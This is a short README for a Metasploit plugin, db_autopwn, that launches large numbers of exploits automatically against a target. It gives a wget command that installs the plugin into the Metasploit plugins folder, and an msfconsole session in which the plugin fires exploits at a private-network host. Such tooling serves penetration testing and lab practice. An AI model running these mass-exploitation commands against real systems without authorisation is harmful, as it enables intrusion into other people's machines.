# metasploit-autopwn

metasploit plugin for easy exploit & vulnerability attack.<br>
But, the db_autopwn command is removed from official distribution.<br>

## Install

### macOS

```
sudo wget https://raw.githubusercontent.com/comwrg/metasploit-autopwn/master/db_autopwn.rb -P /opt/metasploit-framework/embedded/framework/plugins/
```



## Usage
```
    #> msfconsole
    MSF > load db_autopwn
    [*] Successfully loaded plugin: db_autopwn
    
    MSF > db_autopwn -p -R great -e -q 192.168.56.101 
    [-] The db_autopwn command is DEPRECATED
    [-] See http://r-7.co/xY65Zr instead
    [*] (1/1301 [0 sessions]): Launching exploit/bsdi/softcart/mercantec_softcart against 192.168.56.44:80...
    [*] (2/1301 [0 sessions]): Launching exploit/freebsd/http/watchguard_cmd_exec against 192.168.56.44:80...
    [*] (3/1301 [0 sessions]): Launching exploit/linux/antivirus/escan_password_exec against 192.168.56.44:80...
    [*] (4/1301 [0 sessions]): Launching exploit/linux/http/accellion_fta_getstatus_oauth against 192.168.56.44:80...
    [*] (5/1301 [0 sessions]): Launching exploit/linux/http/advantech_switch_bash_env_exec against 192.168.56.44:80...


```
